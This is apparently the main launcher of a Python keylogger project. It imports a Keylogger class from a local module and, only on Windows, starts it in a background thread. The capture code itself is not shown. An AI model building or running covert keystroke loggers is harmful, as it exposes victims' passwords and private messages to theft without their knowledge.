from keylogger import Keylogger
# from logger import Logger
import configparser
import threading
import time
import os

# config = configparser.ConfigParser()

# https://www.branah.com/

if __name__ == "__main__":
    keylogger = Keylogger()
    # logger = Logger()
    if os.name == "nt":
        threading.Thread(target=keylogger).start()
        # threading.Thread(target=logger).start()
